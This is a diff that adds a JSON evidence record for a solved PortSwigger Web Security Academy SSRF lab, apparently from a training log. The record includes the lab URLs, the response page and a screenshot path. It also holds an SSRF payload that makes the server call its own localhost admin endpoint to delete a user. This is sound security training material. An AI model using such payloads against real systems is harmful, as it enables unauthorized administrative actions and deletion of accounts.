@@ -1,0 +1,13 @@
+{
+  "lab": "Basic SSRF against the local server",
+  "officialUrl": "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost",
+  "instanceBase": "https://0a6200e903fb8a1581400226006600a5.web-security-academy.net",
+  "payload": "stockApi=http://localhost/admin/delete?username=carlos",
+  "requestStatus": 401,
+  "responseExcerpt": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Basic SSRF against the local server</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner is-solved'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Basic SSRF against the local server</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost'>\n                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;\n                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' ",
+  "solved": true,
+  "text": "Basic SSRF against the local server\nBack to lab description  \nLAB\n\nSolved\n\nCongratulations, you solved the lab!\nShare your skills! \n \n Continue learning\nHome\n\n|\n\nMy account\nHexbug Battleground Tarantula Double Pack\n $24.96\nView details\nThe Trolley-ON\n $4.59\nView details\nEye Projectors\n $15.12\nView details\nThe Lazy Dog\n $40.69\nView details\nSnow Delivered To Your Door\n $44.20\nView details\nPotato Theater\n $49.94\nView details\nVintage Neck Defender\n $78.13\nView details\nReal Life Photoshopping\n $90.00\nView details\nBabbage Web Spray\n $82.71\nView details\nHigh-End Gift Wrapping\n $34.58\nView details\nAbZorba Ball\n $3.60\nView details\nPortable Hat\n $38.24\nView details\nGrow Your Own Spy Kit\n $93.79\nView details\nPet Experience Days\n $6.82\nView details\nConversation Controlling Lemon\n $4.86\nView details\nAdult Space Hopper\n $69.20\nView details\nThe Alternative Christmas Tree\n $42.98\nView details\nPicture Box\n $1.57\nView details\nGiant Grasshopper\n $3.12\nView details\nCouple's Umbrella\n $0.87\nView details",
+  "title": "Basic SSRF against the local server",
+  "url": "https://0a6200e903fb8a1581400226006600a5.web-security-academy.net/",
+  "evidenceScreenshot": "../screenshots/12-ssrf-localhost-admin-delete-solved.png"
+}
